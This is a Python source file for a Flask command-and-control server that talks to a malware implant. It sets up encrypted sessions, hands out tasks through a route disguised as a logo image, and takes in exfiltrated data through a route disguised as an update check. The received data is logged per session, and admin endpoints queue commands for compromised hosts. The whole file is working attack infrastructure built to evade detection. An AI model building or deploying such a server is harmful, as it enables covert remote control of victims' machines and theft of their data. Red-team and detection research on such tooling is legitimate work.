# c2_server.py
# Flask-based server acting as the C2 server.
# Provides endpoints:
# - /handshake: ECDH handshake
# - /images/logo.png: returns encrypted task instructions for implant
# - /updates/check: receives encrypted exfiltrated data from implant
# - /admin/enqueue: admin-only endpoint to enqueue tasks
#
# Uses dictionary to maintain a task queue for implant(s)

from flask import Flask, request, jsonify
import uuid
import base64
import datetime
import os
import logging
from common.crypto_lib import generate_keypair, derive_key, aes_gcm_encrypt, aes_gcm_decrypt
from common.protocol import encode_message, decode_message

#logging config
default_log = logging.getLogger('werkzeug')
default_log.setLevel(logging.ERROR)
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
LOG_DIR = os.path.join(os.path.dirname(__file__), 'logs') #make sure they exist
os.makedirs(LOG_DIR, exist_ok=True)

app = Flask(
    __name__,
    static_folder='static',       
    static_url_path='/static'     
)

# ─── GLOBAL TASK QUEUE & SESSION STORE ──────────────
task_queue = {}       # sid -> list of pending tasks
session_store = {}     # sid -> {peer_pub, shared_key, seq}
exfil_store = {}       # sid -> list of exfiltrated data entries


def process_exfiltrated(sid, data):
    """
    Store and log decrypted exfiltration data for session `sid`.
    Appends to in-memory store and writes to a per-session log file.
    """
    # initialize store for sid
    if sid not in exfil_store:
        exfil_store[sid] = []
    exfil_store[sid].append(data)

    # log to console
    logging.info(f"Exfil data from {sid}: {data}")

    # append to log file
    logfile = os.path.join(LOG_DIR, f"{sid}.log")
    timestamp = datetime.datetime.now().isoformat()
    with open(logfile, 'a') as f:
        f.write(f"[{timestamp}] {data}\n")

# ─── HANDSHAKE ENDPOINT ──────
@app.route('/handshake', methods=['POST'])
def handshake():
    """
    Client sends Curve25519 public key in JSON {'pubkey': base64}.
    Server responds with its pubkey and a new session ID.
    """
    data = request.get_json()
    client_pub = base64.b64decode(data.get('pubkey', ''))
    # Server generates keypair to derive shared key
    server_priv, server_pub = generate_keypair()
    shared_key = derive_key(server_priv, client_pub)

    # Create new session ID and store session state
    sid = str(uuid.uuid4())
    session_store[sid] = {'peer_pub': client_pub, 'shared_key': shared_key, 'seq': 0}
    task_queue[sid] = []

    return jsonify({'sid': sid, 'pubkey': base64.b64encode(server_pub).decode('ascii')}), 200

# ─── UTILS FOR PAYLOAD ENVELOPE ───────────────
def encrypt_for_implant(sid, seq, cmd, body):
    """
    Wrap in protocol envelope, serialize to JSON, then AES-GCM encrypt.
    """
    #update server-side sequence counter before encryption
    session_store[sid]['seq'] = seq
    #build and serialize envelope
    msg = encode_message(sid=sid, seq=seq, cmd=cmd, body=body)
    #encrypt and return
    return aes_gcm_encrypt(session_store[sid]['shared_key'], msg)

def decrypt_from_implant(sid, ciphertext):
    """
    AES-GCM decrypt, then parse protocol envelope and enforce seq+1.
    """
    plaintext = aes_gcm_decrypt(session_store[sid]['shared_key'], ciphertext)
    envelope = decode_message(plaintext)
    # Enforce sequence increment
    expected = session_store[sid]['seq'] + 1
    if envelope['seq'] != expected:
        raise ValueError(f"Out-of-order sequence: got {envelope['seq']}, expected {expected}")
    session_store[sid]['seq'] = envelope['seq']
    return envelope

# ─── TASKING ENDPOINT ───────
@app.route('/images/logo.png', methods=['GET'])
def get_task():
    sid = request.headers.get('X-Session-ID')
    if sid not in session_store:
        return "Unknown session", 404

    tasks = task_queue.get(sid, [])
    if not tasks:
        return '', 204

    # Pop next task and encrypt
    task = tasks.pop(0)
    encrypted = encrypt_for_implant(sid, session_store[sid]['seq'] + 1, 'task', task)

    response = app.response_class(encrypted, mimetype='application/octet-stream')
    # Disguise as static image
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cache-Control'] = 'public, max-age=86400'
    return response

# ─── EXFILTRATION ENDPOINT ────────
@app.route('/updates/check', methods=['POST'])
def receive_data():
    sid = request.headers.get('X-Session-ID')
    if sid not in session_store:
        return "Unknown session", 404

    ciphertext = request.get_data()
    envelope = decrypt_from_implant(sid, ciphertext)
    process_exfiltrated(sid, envelope['body'])
    return '', 204

# ─── ADMIN ENQUEUE ENDPOINT ─────
@app.route('/admin/enqueue', methods=['POST'])
def admin_enqueue():
    """
    Admin API to enqueue a new task for a given session ID.
    Expects JSON { 'sid': <session-id>, 'cmd': <task-string> }.
    """
    data = request.get_json()
    sid = data.get('sid')
    cmd = data.get('cmd')
    if sid not in session_store:
        return jsonify({'error': 'Unknown session ID'}), 404
    if not cmd:
        return jsonify({'error': 'Missing cmd field'}), 400

    task_queue.setdefault(sid, []).append(cmd)
    return jsonify({'status': 'enqueued', 'sid': sid, 'cmd': cmd}), 200

@app.route('/admin/sessions', methods=['GET'])
def list_sessions():
    return jsonify(list(session_store.keys())), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
